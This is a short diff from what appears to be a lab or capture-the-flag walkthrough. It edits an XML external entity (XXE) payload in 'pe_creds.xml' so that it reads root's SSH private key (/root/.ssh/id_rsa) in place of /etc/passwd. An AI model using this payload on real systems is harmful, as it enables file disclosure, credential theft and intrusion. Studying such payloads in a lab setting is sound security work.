@@ -672,7 +672,7 @@ change the `pe_creds.xml` to this one to get private key for `root` user:
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
 <credits>
   <author>pe</author>
   <image>
